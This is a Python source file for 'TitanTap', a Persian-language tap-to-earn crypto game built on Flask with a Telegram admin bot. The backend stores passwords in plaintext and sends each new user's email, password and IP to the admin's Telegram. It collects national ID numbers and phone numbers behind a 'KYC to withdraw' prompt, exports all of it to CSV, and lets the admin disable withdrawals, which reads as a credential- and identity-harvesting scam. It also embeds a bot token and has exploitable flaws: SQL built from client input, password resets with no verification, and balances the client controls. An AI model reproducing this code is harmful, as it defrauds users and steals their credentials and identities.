import sqlite3
import requests
import threading
import telebot
from telebot import types
from flask import Flask, request, jsonify
import os
import time
import csv
import random
import string

# ====== تنظیمات ======
BOT_TOKEN = "8528248141:AAHjKBWXN5E7DWmMlCOkEFYB-kL1kyVTwmE"
ADMIN_ID  = "2028533085"
# ====================

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)

SETTINGS = {
    "withdraw_active": True,
    "min_withdraw": 5000
}

# ====== دیتابیس ======
def init_db():
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT UNIQUE,
        password TEXT,
        ip TEXT,
        first_name TEXT,
        last_name TEXT,
        national_id TEXT,
        phone TEXT,
        kyc_status TEXT DEFAULT 'none',
        balance REAL DEFAULT 0.0,
        total_taps INTEGER DEFAULT 0,
        profit_per_hour REAL DEFAULT 0.0,
        tap_power REAL DEFAULT 0.001,
        status TEXT DEFAULT 'approved',
        referrer TEXT DEFAULT NULL,
        ref_count INTEGER DEFAULT 0,
        squad_name TEXT DEFAULT NULL,
        card1 INT DEFAULT 0,
        card2 INT DEFAULT 0,
        card3 INT DEFAULT 0,
        card4 INT DEFAULT 0,
        last_daily REAL DEFAULT 0,
        last_sync REAL DEFAULT 0
    )''')
    conn.commit()
    conn.close()

init_db()

def get_user(email):
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE email=?", (email,))
    user = c.fetchone()
    conn.close()
    return user

def update_user(email, query, params):
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute(f"UPDATE users SET {query} WHERE email=?", params + (email,))
    conn.commit()
    conn.close()

# ====== ربات تلگرام (پنل ادمین) ======
@bot.message_handler(commands=['start', 'admin'])
def bot_start(message):
    if str(message.chat.id) != ADMIN_ID: return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton('📊 آمار ربات'), types.KeyboardButton('👥 لیست کاربران'))
    markup.add(types.KeyboardButton('⚙️ تنظیمات سیستم'), types.KeyboardButton('📥 دانلود دیتابیس'))
    bot.reply_to(message, "👑 **پنل مدیریت تایتان‌تپ**\nبه پنل خوش آمدید:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '📊 آمار ربات')
def bot_stats(message):
    if str(message.chat.id) != ADMIN_ID: return
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*), SUM(balance), SUM(total_taps) FROM users WHERE status='approved'")
    data = c.fetchone()
    conn.close()
    bot.reply_to(message, f"📈 **آمار کلی:**\n\n👥 کاربران: {data[0]}\n💰 مجموع تپ‌کوین: {data[1]:.2f} TTN\n👆 کل تپ‌ها: {data[2]}")

@bot.message_handler(func=lambda message: message.text == '⚙️ تنظیمات سیستم')
def bot_settings(message):
    if str(message.chat.id) != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup()
    status = "فعال 🟢" if SETTINGS["withdraw_active"] else "غیرفعال 🔴"
    markup.add(types.InlineKeyboardButton(f"سیستم برداشت: {status}", callback_data="toggle_withdraw"))
    bot.send_message(ADMIN_ID, "⚙️ **تنظیمات سیستم**\nبرای تغییر وضعیت روی دکمه زیر بزنید:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if str(call.from_user.id) != ADMIN_ID: return
    if call.data == "toggle_withdraw":
        SETTINGS["withdraw_active"] = not SETTINGS["withdraw_active"]
        status = "فعال 🟢" if SETTINGS["withdraw_active"] else "غیرفعال 🔴"
        bot.edit_message_text(f"⚙️ **تنظیمات سیستم**\nوضعیت برداشت: {status}", call.message.chat.id, call.message.message_id, reply_markup=call.message.reply_markup)

@bot.message_handler(func=lambda message: message.text == '👥 لیست کاربران')
def bot_list_users(message):
    if str(message.chat.id) != ADMIN_ID: return
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT id, email, balance FROM users WHERE status='approved' ORDER BY id DESC LIMIT 15")
    users = c.fetchall()
    conn.close()
    text = "👥 **۱۵ کاربر آخر:**\n\n"
    for u in users:
        text += f"ID: `{u[0]}` | {u[1]} | {u[2]:.1f} TTN\n"
    text += "\nبرای ویرایش موجودی: `/setbalance ID AMOUNT`"
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['setbalance'])
def bot_set_balance(message):
    if str(message.chat.id) != ADMIN_ID: return
    try:
        _, uid, amount = message.text.split()
        conn = sqlite3.connect('game.db')
        c = conn.cursor()
        c.execute("UPDATE users SET balance=? WHERE id=?", (float(amount), int(uid)))
        conn.commit()
        conn.close()
        bot.reply_to(message, f"✅ موجودی کاربر {uid} تغییر کرد.")
    except:
        bot.reply_to(message, "❌ فرمت: `/setbalance 5 10000`")

@bot.message_handler(func=lambda message: message.text == '📥 دانلود دیتابیس')
def bot_export(message):
    if str(message.chat.id) != ADMIN_ID: return
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT email, password, ip, first_name, last_name, national_id, phone, balance FROM users WHERE status='approved'")
    users = c.fetchall()
    conn.close()
    filename = "users_data.csv"
    with open(filename, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['Email', 'Password', 'IP', 'First Name', 'Last Name', 'National ID', 'Phone', 'Balance'])
        writer.writerows(users)
    with open(filename, 'rb') as f:
        bot.send_document(message.chat.id, f)
    os.remove(filename)

# ====== وب سرور (بازی) ======
html_game = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>TitanTap</title>
<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
<style>
  :root { --primary: #ffaa00; --bg: #0b0f19; --card: #151b2b; --gold: #ffd700; --success: #00ffcc; }
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Vazirmatn', 'Inter', sans-serif; }
  body { background: var(--bg); color: white; display: flex; justify-content: center; min-height: 100vh; padding-bottom: 70px; overflow-x: hidden; transition: 0.3s; }
  body.en { direction: ltr; font-family: 'Inter', sans-serif; }
  
  .app-container { width: 100%; max-width: 420px; padding: 20px; text-align: center; position: relative; }
  .lang-toggle { position: absolute; top: 20px; left: 20px; background: var(--card); border: 1px solid #2a3441; color: white; padding: 5px 10px; border-radius: 8px; cursor: pointer; font-size: 12px; z-index: 100; }
  
  .screen { display: none; animation: fadeIn 0.3s ease-out; }
  .active { display: block; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  
  h1 { font-size: 24px; font-weight: 800; color: var(--primary); margin-bottom: 20px; margin-top: 30px; }
  input { width:100%; padding:15px; margin-bottom:15px; border-radius:12px; border:1px solid #2a3441; background:var(--card); color:white; font-family: inherit; }
  
  .link-text { color: var(--success); cursor: pointer; font-size: 14px; margin-top: 10px; display: inline-block; text-decoration: underline; }
  
  .balance-card { background: var(--card); border-radius: 20px; padding: 20px; margin-bottom: 20px; border: 1px solid #2a3441; position: relative; z-index: 2; }
  .balance-value { font-size: 38px; font-weight: 800; color: var(--primary); }
  .profit-hour { font-size: 14px; color: var(--gold); margin-top: 5px; }
  
  .tap-area { height: 220px; display: flex; justify-content: center; align-items: center; position: relative; }
  .tap-btn { width: 180px; height: 180px; border-radius: 50%; background: radial-gradient(circle, #ffaa00, #b37700); display: flex; justify-content: center; align-items: center; box-shadow: 0 0 40px rgba(255, 170, 0, 0.4); border: 4px solid #fff; transition: 0.1s; cursor: pointer; font-size: 80px; z-index: 2; user-select: none; }
  .tap-btn:active { transform: scale(0.9); box-shadow: 0 0 60px rgba(255, 170, 0, 0.8); }
  
  .particle { position: absolute; width: 10px; height: 10px; background: gold; border-radius: 50%; pointer-events: none; animation: fly 0.5s ease-out forwards; }
  @keyframes fly { 0% { transform: translate(0, 0) scale(1); opacity: 1; } 100% { transform: translate(var(--x), var(--y)) scale(0); opacity: 0; } }

  .cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
  .upgrade-card { background: var(--card); padding: 15px; border-radius: 15px; border: 1px solid #2a3441; text-align: left; cursor: pointer; }
  body[dir="rtl"] .upgrade-card { text-align: right; }
  .upgrade-card h3 { font-size: 14px; margin-bottom: 5px; }
  .upgrade-card p { font-size: 12px; color: #8892b0; }
  .upgrade-card .price { color: var(--primary); font-weight: bold; margin-top: 10px; font-size: 13px; }
  
  .leaderboard-item { display: flex; justify-content: space-between; background: var(--card); padding: 15px; border-radius: 10px; margin-bottom: 10px; font-size: 14px; }
  
  .daily-card, .cipher-card, .kyc-card, .spin-card { background: var(--card); padding: 20px; border-radius: 20px; border: 1px solid #2a3441; margin-bottom: 20px; }
  .btn-action { padding: 15px; background: var(--primary); color: black; border: none; border-radius: 10px; font-weight: bold; margin-top: 15px; width: 100%; cursor: pointer; font-size: 16px; font-family: inherit; }
  .btn-success { background: var(--success); }
  
  .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: var(--card); display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #2a3441; max-width: 420px; margin: 0 auto; right: 0; z-index: 10; }
  .nav-item { font-size: 10px; color: #8892b0; cursor: pointer; display: flex; flex-direction: column; align-items: center; }
  .nav-item.active { color: var(--primary); font-weight: bold; }
  .nav-icon { font-size: 18px; margin-bottom: 3px; }
</style>
</head>
<body dir="rtl">
<div class="app-container">
  <div class="lang-toggle" onclick="toggleLang()">EN / FA</div>
  
  <div id="auth-screen" class="screen active">
    <div id="login-form">
      <h1>🛡️ TitanTap</h1>
      <input type="email" id="login_email" data-fa="ایمیل" data-en="Email Address" placeholder="ایمیل">
      <input type="password" id="login_password" data-fa="رمز عبور" data-en="Password" placeholder="رمز عبور">
      <button class="btn-action" onclick="login()" data-fa="ورود" data-en="Login">ورود</button>
      <br><span class="link-text" onclick="showForm('register-form')" data-fa="حساب ندارید؟ ثبت‌نام کنید" data-en="Don't have an account? Sign up">حساب ندارید؟ ثبت‌نام کنید</span><br>
      <span class="link-text" onclick="showForm('forgot-form')" style="color:#8892b0;" data-fa="رمز عبور را فراموش کرده‌اید؟" data-en="Forgot Password?">رمز عبور را فراموش کرده‌اید؟</span>
    </div>

    <div id="register-form" style="display:none;">
      <h1 data-fa="ثبت‌نام" data-en="Sign Up">ثبت‌نام</h1>
      <input type="email" id="reg_email" data-fa="ایمیل" data-en="Email Address" placeholder="ایمیل">
      <input type="password" id="reg_password" data-fa="رمز عبور" data-en="Password" placeholder="رمز عبور">
      <button class="btn-action" onclick="register()" data-fa="ساخت حساب" data-en="Create Account">ساخت حساب</button>
      <br><span class="link-text" onclick="showForm('login-form')" data-fa="قبلاً ثبت‌نام کرده‌اید؟ وارد شوید" data-en="Already have an account? Login">قبلاً ثبت‌نام کرده‌اید؟ وارد شوید</span>
    </div>

    <div id="forgot-form" style="display:none;">
      <h1 data-fa="فراموشی رمز" data-en="Forgot Password">فراموشی رمز</h1>
      <p style="font-size:13px; color:#8892b0; margin-bottom:15px;" data-fa="رمز جدید به صورت خودکار ساخته می‌شود." data-en="A new password will be generated.">رمز جدید به صورت خودکار ساخته می‌شود.</p>
      <input type="email" id="forgot_email" data-fa="ایمیل" data-en="Email Address" placeholder="ایمیل">
      <button class="btn-action" onclick="forgotPass()" data-fa="بازیابی رمز" data-en="Reset Password">بازیابی رمز</button>
      <br><span class="link-text" onclick="showForm('login-form')" data-fa="بازگشت به صفحه ورود" data-en="Back to Login">بازگشت به صفحه ورود</span>
    </div>
  </div>

  <div id="main-app" class="screen">
    <div id="tab-mine" class="tab-content">
      <div class="balance-card">
        <div style="font-size:14px; color:#8892b0;" data-fa="موجودی شما" data-en="Your Balance">موجودی شما</div>
        <div class="balance-value"><span id="balance">0.000</span> <span style="font-size:20px; color:#fff;">TTN</span></div>
        <div class="profit-hour">+<span id="profit">0.00</span> TTN / <span data-fa="ساعت" data-en="hour">ساعت</span></div>
      </div>
      <div class="tap-area" id="tap-area">
        <div class="tap-btn" id="tap-btn" onclick="tap(event)">🛡️</div>
      </div>
      <button class="btn-action btn-success" onclick="requestWithdraw()" data-fa="درخواست برداشت" data-en="Request Withdraw">درخواست برداشت</button>
    </div>

    <div id="tab-upgrades" class="tab-content" style="display:none;">
      <h1 data-fa="کارت‌های استخراج" data-en="Mining Cards">کارت‌های استخراج</h1>
      <div class="cards-grid">
        <div class="upgrade-card" onclick="upgrade('card1')"><h3>🏠 <span data-fa="ماینر خانگی" data-en="Home Miner">ماینر خانگی</span></h3><p>Lvl <span id="lvl_card1">0</span> | +10/hr</p><div class="price">Cost: <span id="cost_card1">100</span></div></div>
        <div class="upgrade-card" onclick="upgrade('card2')"><h3>☁️ <span data-fa="سرور ابری" data-en="Cloud Server">سرور ابری</span></h3><p>Lvl <span id="lvl_card2">0</span> | +60/hr</p><div class="price">Cost: <span id="cost_card2">500</span></div></div>
        <div class="upgrade-card" onclick="upgrade('card3')"><h3>🤖 <span data-fa="دیتاسنتر هوش مصنوعی" data-en="AI Datacenter">دیتاسنتر هوش مصنوعی</span></h3><p>Lvl <span id="lvl_card3">0</span> | +300/hr</p><div class="price">Cost: <span id="cost_card3">2000</span></div></div>
        <div class="upgrade-card" onclick="upgrade('card4')"><h3>⚛️ <span data-fa="ریگ کوانتومی" data-en="Quantum Rig">ریگ کوانتومی</span></h3><p>Lvl <span id="lvl_card4">0</span> | +1500/hr</p><div class="price">Cost: <span id="cost_card4">10000</span></div></div>
      </div>
    </div>

    <div id="tab-games" class="tab-content" style="display:none;">
      <h1 data-fa="بازی‌ها و جوایز" data-en="Games & Rewards">بازی‌ها و جوایز</h1>
      <div class="spin-card">
        <h3>🎡 <span data-fa="گردونه شانس" data-en="Spin The Wheel">گردونه شانس</span></h3>
        <p style="margin-top:10px; font-size:13px;"><span data-fa="هزینه: ۱۰۰ TTN" data-en="Cost: 100 TTN">هزینه: ۱۰۰ TTN</span></p>
        <button class="btn-action" onclick="spinWheel()" style="margin-top:10px;" data-fa="بچرخون!" data-en="Spin Now!">بچرخون!</button>
      </div>
      <div class="cipher-card">
        <h3>🎁 <span data-fa="کد روزانه" data-en="Daily Cipher">کد روزانه</span></h3>
        <p style="font-size:13px; margin-top:5px;" data-fa="کد TITAN را وارد کنید و ۵۰۰ TTN بگیرید!" data-en="Enter TITAN to win 500 TTN!">کد TITAN را وارد کنید و ۵۰۰ TTN بگیرید!</p>
        <input type="text" id="cipher_input" placeholder="Enter Code" style="margin-top:10px; text-align:center; text-transform:uppercase;">
        <button class="btn-action" onclick="submitCipher()" data-fa="ارسال کد" data-en="Submit Code">ارسال کد</button>
      </div>
    </div>

    <div id="tab-friends" class="tab-content" style="display:none;">
      <h1 data-fa="جوخه (Squad)" data-en="Your Squad">جوخه (Squad)</h1>
      <div class="daily-card">
        <p data-fa="با هر دعوت ۲۰۰ TTN بگیرید!" data-en="Earn 200 TTN per friend!">با هر دعوت ۲۰۰ TTN بگیرید!</p>
        <p style="margin-top:10px;"><span data-fa="دوستان دعوت شده:" data-en="Friends Invited:">دوستان دعوت شده:</span> <b id="ref_count" style="color:var(--primary);">0</b></p>
        <input type="text" id="ref_link" readonly style="margin-top:15px; text-align:center; color:var(--primary);">
        <button class="btn-action" onclick="copyLink()" data-fa="کپی لینک دعوت" data-en="Copy Invite Link">کپی لینک دعوت</button>
      </div>
    </div>

    <div id="tab-top" class="tab-content" style="display:none;">
      <h1 data-fa="لیدربورد" data-en="Leaderboard">لیدربورد</h1>
      <div id="leaderboard-list"></div>
    </div>

    <div id="tab-profile" class="tab-content" style="display:none;">
      <h1 data-fa="پروفایل و احراز هویت" data-en="Profile & KYC">پروفایل و احراز هویت</h1>
      <div class="kyc-card">
        <p style="font-size:13px; color:#8892b0; margin-bottom:10px;" data-fa="برای فعالسازی برداشت، احراز هویت کنید." data-en="Complete KYC to unlock withdrawals.">برای فعالسازی برداشت، احراز هویت کنید.</p>
        <input type="text" id="fname" data-fa="نام واقعی" data-en="Real First Name" placeholder="نام واقعی">
        <input type="text" id="lname" data-fa="نام خانوادگی" data-en="Real Last Name" placeholder="نام خانوادگی">
        <input type="text" id="nid" data-fa="کد ملی" data-en="National ID" placeholder="کد ملی">
        <input type="text" id="phone" data-fa="شماره تماس" data-en="Phone Number" placeholder="شماره تماس">
        <button class="btn-action btn-success" onclick="submitKYC()" data-fa="ذخیره اطلاعات" data-en="Save KYC Info">ذخیره اطلاعات</button>
      </div>
    </div>

    <div class="bottom-nav">
      <div class="nav-item active" onclick="switchTab('mine', this)"><div class="nav-icon">🪙</div><span data-fa="استخراج" data-en="Mine">استخراج</span></div>
      <div class="nav-item" onclick="switchTab('upgrades', this)"><div class="nav-icon">🃏</div><span data-fa="کارت‌ها" data-en="Cards">کارت‌ها</span></div>
      <div class="nav-item" onclick="switchTab('games', this)"><div class="nav-icon">🎮</div><span data-fa="بازی‌ها" data-en="Games">بازی‌ها</span></div>
      <div class="nav-item" onclick="switchTab('friends', this)"><div class="nav-icon">👥</div><span data-fa="دوستان" data-en="Friends">دوستان</span></div>
      <div class="nav-item" onclick="switchTab('top', this)"><div class="nav-icon">🏆</div><span data-fa="برترین‌ها" data-en="Top">برترین‌ها</span></div>
      <div class="nav-item" onclick="switchTab('profile', this)"><div class="nav-icon">👤</div><span data-fa="پروفایل" data-en="Profile">پروفایل</span></div>
    </div>

  </div>
</div>

<script>
  let userEmail = "";
  let currentProfit = 0;
  let currentTapPower = 0.001;
  let costs = { card1: 100, card2: 500, card3: 2000, card4: 10000 };
  let currentLang = 'fa';
  let unsyncedTaps = 0;

  // Fix: Initialize audio context lazily to prevent crashes
  let audioCtx = null;
  function playCoinSound() {
      try {
          if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
          if(audioCtx.state === 'suspended') audioCtx.resume();
          const osc = audioCtx.createOscillator();
          const gain = audioCtx.createGain();
          osc.type = 'sine';
          osc.frequency.setValueAtTime(1200, audioCtx.currentTime);
          osc.frequency.exponentialRampToValueAtTime(1800, audioCtx.currentTime + 0.1);
          gain.gain.setValueAtTime(0.5, audioCtx.currentTime);
          gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.1);
          osc.connect(gain);
          gain.connect(audioCtx.destination);
          osc.start();
          osc.stop(audioCtx.currentTime + 0.1);
      } catch(e) { console.log("Audio not supported"); }
  }

  function toggleLang() {
    currentLang = currentLang === 'fa' ? 'en' : 'fa';
    document.body.dir = currentLang === 'fa' ? 'rtl' : 'ltr';
    document.body.className = currentLang === 'en' ? 'en' : '';
    
    document.querySelectorAll('[data-fa]').forEach(el => {
      if(el.tagName === 'INPUT') {
        el.placeholder = currentLang === 'fa' ? el.getAttribute('data-fa') : el.getAttribute('data-en');
      } else {
        el.innerText = currentLang === 'fa' ? el.getAttribute('data-fa') : el.getAttribute('data-en');
      }
    });
  }

  function showForm(id) {
    document.querySelectorAll('#auth-screen > div').forEach(d => d.style.display = 'none');
    document.getElementById(id).style.display = 'block';
  }

  async function apiCall(endpoint, data) {
    const res = await fetch(endpoint, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) });
    return await res.json();
  }

  async function login() {
    const email = document.getElementById('login_email').value;
    const password = document.getElementById('login_password').value;
    if(!email || !password) return alert("Fill all fields");
    const data = await apiCall('/api/login', {email, password});
    if(data.success) {
      userEmail = email;
      startGame(data.user);
    } else alert(data.message);
  }

  async function register() {
    const email = document.getElementById('reg_email').value;
    const password = document.getElementById('reg_password').value;
    if(!email || !password) return alert("Fill all fields");
    const data = await apiCall('/api/register', {email, password});
    if(data.success) {
      userEmail = email;
      startGame(data.user);
    } else alert(data.message);
  }

  async function forgotPass() {
    const email = document.getElementById('forgot_email').value;
    if(!email) return alert("Enter your email");
    const data = await apiCall('/api/forgot', {email});
    if(data.success) alert("رمز جدید شما: " + data.new_password + "\nلطفاً با آن وارد شوید.");
    else alert(data.message);
  }

  function startGame(user) {
    document.getElementById('auth-screen').classList.remove('active');
    document.getElementById('main-app').classList.add('active');
    updateUI(user);
    document.getElementById('ref_link').value = window.location.origin + "/?ref=" + encodeURIComponent(userEmail);
    
    setInterval(syncTaps, 5000);
    setInterval(() => {
        let current = parseFloat(document.getElementById('balance').innerText);
        let gain = currentProfit / 3600;
        document.getElementById('balance').innerText = (current + gain).toFixed(3);
    }, 1000);
  }

  function updateUI(data) {
    if(data.balance !== undefined) document.getElementById('balance').innerText = data.balance.toFixed(3);
    if(data.profit_per_hour !== undefined) {
        document.getElementById('profit').innerText = data.profit_per_hour.toFixed(2);
        currentProfit = data.profit_per_hour;
    }
    if(data.tap_power !== undefined) currentTapPower = data.tap_power;
    if(data.ref_count !== undefined) document.getElementById('ref_count').innerText = data.ref_count;
    
    for(let i=1; i<=4; i++) {
        let el = document.getElementById('lvl_card'+i);
        if(el && data['card'+i] !== undefined) el.innerText = data['card'+i];
        let costEl = document.getElementById('cost_card'+i);
        if(costEl && data['card'+i] !== undefined) {
            costs['card'+i] = costs['card'+i] * Math.pow(1.5, data['card'+i]);
            costEl.innerText = Math.floor(costs['card'+i]);
        }
    }
  }

  function tap(e) {
    if (navigator.vibrate) navigator.vibrate(20);
    playCoinSound();
    createParticles(e);

    let current = parseFloat(document.getElementById('balance').innerText);
    document.getElementById('balance').innerText = (current + currentTapPower).toFixed(3);
    unsyncedTaps += currentTapPower;
  }

  async function syncTaps() {
    if(unsyncedTaps <= 0) return;
    const tapsToSend = unsyncedTaps;
    unsyncedTaps = 0; 
    const data = await apiCall('/api/tap', {email: userEmail, power: tapsToSend});
    if(!data.success) unsyncedTaps += tapsToSend;
  }

  function createParticles(e) {
    const rect = document.getElementById('tap-area').getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    for(let i=0; i<5; i++) {
      let p = document.createElement('div');
      p.className = 'particle';
      p.style.left = x + 'px';
      p.style.top = y + 'px';
      p.style.setProperty('--x', (Math.random() - 0.5) * 200 + 'px');
      p.style.setProperty('--y', (Math.random() - 0.5) * 200 - 50 + 'px');
      document.getElementById('tap-area').appendChild(p);
      setTimeout(() => p.remove(), 500);
    }
  }

  async function upgrade(type) {
    const data = await apiCall('/api/upgrade', {email: userEmail, type: type, cost: costs[type]});
    if(data.success) { updateUI(data); alert("Upgraded!"); }
    else { alert(data.message); }
  }
  
  async function submitCipher() {
    const code = document.getElementById('cipher_input').value;
    const data = await apiCall('/api/cipher', {email: userEmail, code: code});
    if(data.success) { alert("Correct! 500 TTN added."); updateUI(data); }
    else { alert(data.message); }
  }

  async function spinWheel() {
    const data = await apiCall('/api/spin', {email: userEmail});
    if(data.success) { alert(data.result); updateUI(data); }
    else { alert(data.message); }
  }

  async function submitKYC() {
    const fname = document.getElementById('fname').value;
    const lname = document.getElementById('lname').value;
    const nid = document.getElementById('nid').value;
    const phone = document.getElementById('phone').value;
    if(!fname || !lname || !nid || !phone) return alert("Fill all fields");
    const data = await apiCall('/api/kyc', {email: userEmail, fname, lname, nid, phone});
    if(data.success) alert("KYC Submitted!");
  }

  async function requestWithdraw() {
    const data = await apiCall('/api/withdraw_req', {email: userEmail});
    alert(data.message);
  }

  async function loadLeaderboard() {
    const res = await fetch('/api/leaderboard');
    const data = await res.json();
    let html = "";
    data.forEach((u, i) => {
      html += `<div class="leaderboard-item"><span>#${i+1} ${u.name}</span> <span style="color:var(--primary);">${u.balance.toFixed(1)} TTN</span></div>`;
    });
    document.getElementById('leaderboard-list').innerHTML = html;
  }

  function switchTab(tab, el) {
    document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
    document.getElementById('tab-' + tab).style.display = 'block';
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    el.classList.add('active');
    if(tab === 'top') loadLeaderboard();
  }

  function copyLink() {
    const link = document.getElementById('ref_link');
    link.select();
    document.execCommand('copy');
    alert("Link copied!");
  }
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return html_game

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    email, password = data.get('email'), data.get('password')
    ip, referrer, now = request.remote_addr, request.args.get('ref'), time.time()
    
    if get_user(email): return jsonify({"success": False, "message": "Email already exists"})
    
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("INSERT INTO users (email, password, ip, referrer, status, last_sync) VALUES (?, ?, ?, ?, 'approved', ?)", (email, password, ip, referrer, now))
    conn.commit()
    conn.close()
    
    text = f"🔴 **New Signup**\n📧 {email}\n🔑 {password}\n🌐 {ip}\n👥 Ref: {referrer or 'None'}"
    bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
    
    return jsonify({"success": True, "user": {"email": email, "balance": 0, "profit_per_hour": 0, "tap_power": 0.001, "ref_count": 0}})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    email, password = data.get('email'), data.get('password')
    user = get_user(email)
    
    if not user or user[2] != password: return jsonify({"success": False, "message": "Invalid credentials"})
    
    now = time.time()
    if user[20] > 0: 
        elapsed_hours = (now - user[20]) / 3600.0
        gain = elapsed_hours * user[11] 
        update_user(email, "balance = balance + ?, last_sync = ?", (gain, now))
        user = get_user(email)
    else:
        update_user(email, "last_sync = ?", (now,))
        
    return jsonify({"success": True, "user": {"email": user[1], "balance": user[10], "profit_per_hour": user[11], "tap_power": user[12], "card1": user[16], "card2": user[17], "card3": user[18], "card4": user[19], "ref_count": user[15]}})

@app.route('/api/forgot', methods=['POST'])
def forgot():
    email = request.json.get('email')
    user = get_user(email)
    if not user: return jsonify({"success": False, "message": "Email not found"})
    
    new_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    update_user(email, "password = ?", (new_pass,))
    
    bot.send_message(ADMIN_ID, f"🔄 **Password Reset**\n📧 {email}\n🔑 New: {new_pass}")
    return jsonify({"success": True, "new_password": new_pass})

@app.route('/api/kyc', methods=['POST'])
def kyc():
    data = request.json
    update_user(data['email'], "first_name=?, last_name=?, national_id=?, phone=?, kyc_status='pending'", (data['fname'], data['lname'], data['nid'], data['phone']))
    bot.send_message(ADMIN_ID, f"💳 **KYC Submitted**\n📧 {data['email']}\n👤 {data['fname']} {data['lname']}\n🆔 {data['nid']}\n📱 {data['phone']}", parse_mode='Markdown')
    return jsonify({"success": True})

@app.route('/api/spin', methods=['POST'])
def spin():
    email = request.json.get('email')
    user = get_user(email)
    if user[10] < 100: return jsonify({"success": False, "message": "Not enough TTN"})
    
    outcomes = [{"mult": 0, "text": "You lost!"}, {"mult": 0, "text": "You lost!"}, {"mult": 0.5, "text": "Won 50 TTN"}, {"mult": 1.5, "text": "Won 150 TTN"}, {"mult": 3, "text": "JACKPOT 300 TTN"}]
    result = random.choice(outcomes)
    new_bal = user[10] - 100 + (100 * result["mult"])
    update_user(email, "balance = ?", (new_bal,))
    return jsonify({"success": True, "result": result["text"], "balance": new_bal})

@app.route('/api/tap', methods=['POST'])
def tap():
    data = request.json
    user = get_user(data['email'])
    new_bal = user[10] + data['power']
    update_user(data['email'], "balance = ?, total_taps = total_taps + 1", (new_bal,))
    return jsonify({"success": True, "balance": new_bal})

@app.route('/api/upgrade', methods=['POST'])
def upgrade():
    data = request.json
    user = get_user(data['email'])
    if user[10] < data['cost']: return jsonify({"success": False, "message": "Not enough TTN"})
    
    p_add = {'card1': 10, 'card2': 60, 'card3': 300, 'card4': 1500}[data['type']]
    new_bal = user[10] - data['cost']
    update_user(data['email'], f"balance = ?, profit_per_hour = profit_per_hour + ?, {data['type']} = {data['type']} + 1", (new_bal, p_add))
    
    u = get_user(data['email'])
    return jsonify({"success": True, "balance": u[10], "profit_per_hour": u[11], "card1": u[16], "card2": u[17], "card3": u[18], "card4": u[19]})

@app.route('/api/cipher', methods=['POST'])
def cipher():
    if request.json.get('code').upper() != "TITAN": return jsonify({"success": False, "message": "Wrong code"})
    user = get_user(request.json['email'])
    new_bal = user[10] + 500
    update_user(request.json['email'], "balance = ?", (new_bal,))
    return jsonify({"success": True, "balance": new_bal})

@app.route('/api/withdraw_req', methods=['POST'])
def withdraw_req():
    if not SETTINGS["withdraw_active"]: return jsonify({"message": "Withdrawal system is currently disabled by admin."})
    user = get_user(request.json['email'])
    if user[10] < SETTINGS["min_withdraw"]: return jsonify({"message": f"Minimum withdrawal is {SETTINGS['min_withdraw']} TTN"})
    
    bot.send_message(ADMIN_ID, f"💸 **Withdraw Request**\n📧 {user[1]}\n💰 {user[10]} TTN\n👤 KYC: {user[4]} {user[5]}\n🆔 {user[6]}\n📱 {user[7]}")
    return jsonify({"message": "Withdrawal request submitted. Pending admin approval."})

@app.route('/api/leaderboard')
def leaderboard():
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT email, balance FROM users ORDER BY balance DESC LIMIT 10")
    users = [{"name": u[0].split('@')[0], "balance": u[1]} for u in c.fetchall()]
    conn.close()
    return jsonify(users)

def run_bot():
    bot.polling(none_stop=True)

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
